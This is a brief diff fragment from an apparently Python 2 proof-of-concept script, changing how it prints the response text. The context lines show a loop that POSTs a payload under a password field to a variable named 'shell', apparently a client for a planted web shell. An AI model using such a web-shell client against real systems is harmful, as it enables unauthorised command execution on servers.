@@ -50,7 +50,7 @@ def poc():
 						password : payload
 					}
 					r = requests.post(shell, data=postdata)
-					print r.text
+					print r.text.encode(r.encoding)
 				else:
 					flag = 0
 			except EOFError as e:
